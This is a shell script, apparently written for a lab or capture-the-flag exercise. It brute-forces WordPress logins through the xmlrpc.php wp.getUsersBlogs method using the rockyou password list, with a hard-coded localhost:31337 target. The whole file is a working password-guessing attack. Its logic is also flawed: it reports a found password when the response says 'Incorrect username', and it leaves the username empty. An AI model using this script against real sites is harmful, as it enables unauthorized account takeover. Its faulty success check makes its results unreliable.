#!/bin/sh

trap 'exit 1' EXIT

username=''
password=''

xmlTempl() {
cat <<- EOF
	<?xml version= \"1.0\" encoding= \"utf-8\"?>
	<methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
			<param>
				<value>$username</value>
			</param>
			<param>
				<value>$password</value>
			</param>
		</params>
	</methodCall>
EOF
}

xmlCreate() {
	password=${1:?}
	url='http://localhost:31337/xmlrpc.php'

	xmlTempl > file.xml

	res=$(curl -s -X POST "$url" -d@file.xml)

	if echo "$res" | grep -q 'Incorrect username'
	then
		printf '%s\n' "The password for user is: $password"
	fi
}

main() {

	while read -r password
	do
		xmlCreate "$password"
	done < "${rockYouTxt:-}"
}

main
